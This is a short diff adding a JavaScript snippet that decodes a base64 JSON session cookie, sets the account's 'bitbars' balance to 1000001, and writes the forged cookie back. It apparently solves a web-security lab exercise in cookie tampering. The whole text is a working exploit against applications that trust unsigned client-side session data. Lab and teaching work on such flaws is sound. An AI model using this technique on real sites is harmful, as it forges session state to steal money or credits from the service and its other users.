@@ -1,0 +1,11 @@
+let sessionCookie = document.cookie.split("=")[1];
+let decodedCookie = atob(sessionCookie);
+let cookieObject = JSON.parse(decodedCookie);
+
+cookieObject.account.bitbars = 1000001;
+
+// Re-encode the modified cookie back to base64
+let modifiedCookie = btoa(JSON.stringify(cookieObject));
+
+// Update the session cookie in the browser
+document.cookie = `session=${modifiedCookie}; path=/`;
